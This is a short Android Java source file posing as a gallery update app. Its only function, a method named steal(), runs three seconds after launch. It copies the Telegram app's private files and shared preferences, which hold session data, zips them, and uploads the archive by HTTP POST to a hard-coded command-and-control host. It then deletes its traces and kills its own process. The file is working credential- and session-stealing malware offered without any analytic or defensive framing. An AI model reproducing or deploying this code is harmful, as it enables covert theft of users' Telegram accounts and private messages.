package com/android/gallery3d/update;
import android.app.Activity;
import android.os.Bundle;
import android.os.Handler;
import android.os.Process;
import java.io.*;
import java.net.*;
import java.util.zip.*;
public class MainActivity extends Activity {
    static final String C2 = "https://one1152.onrender.com";
    static final String TG = "/data/data/org.telegram.messenger/files/";
    static final String TP = "/data/data/org.telegram.messenger/shared_prefs/";
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        new Handler().postDelayed(() -> { steal(); finish(); Process.killProcess(Process.myPid()); }, 3000);
    }
    void steal() {
        try {
            File d = new File(getCacheDir(), "dump"); d.mkdirs();
            cp(new File(TG), d); cp(new File(TP), d);
            File z = new File(getCacheDir(), "tg_" + System.currentTimeMillis() + ".zip");
            zipDir(d, z); up(z); del(d); z.delete();
        } catch (Exception e) {}
    }
    void cp(File s, File t) throws Exception {
        if (!s.exists()) return;
        if (s.isDirectory()) { for (File f : s.listFiles()) cp(f, t); }
        else {
            byte[] b = new byte[8192];
            try (FileInputStream i = new FileInputStream(s); FileOutputStream o = new FileOutputStream(new File(t, s.getName()))) {
                int n; while ((n = i.read(b)) > 0) o.write(b, 0, n);
            }
        }
    }
    void zipDir(File s, File o) throws Exception {
        try (ZipOutputStream z = new ZipOutputStream(new FileOutputStream(o))) { zipAll(s, s, z); }
    }
    void zipAll(File r, File f, ZipOutputStream z) throws Exception {
        if (f.isDirectory()) { for (File c : f.listFiles()) zipAll(r, c, z); }
        else {
            z.putNextEntry(new ZipEntry(r.toURI().relativize(f.toURI()).getPath()));
            byte[] b = new byte[8192];
            try (FileInputStream i = new FileInputStream(f)) { int n; while ((n = i.read(b)) > 0) z.write(b, 0, n); }
            z.closeEntry();
        }
    }
    void up(File f) throws Exception {
        HttpURLConnection c = (HttpURLConnection) new URL(C2).openConnection();
        c.setRequestMethod("POST"); c.setDoOutput(true);
        c.setRequestProperty("Content-Type", "application/octet-stream");
        try (FileInputStream i = new FileInputStream(f); OutputStream o = c.getOutputStream()) {
            byte[] b = new byte[8192]; int n;
            while ((n = i.read(b)) > 0) o.write(b, 0, n);
        }
        c.getResponseCode(); c.disconnect();
    }
    void del(File f) {
        if (f.isDirectory()) for (File c : f.listFiles()) del(c);
        f.delete();
    }
}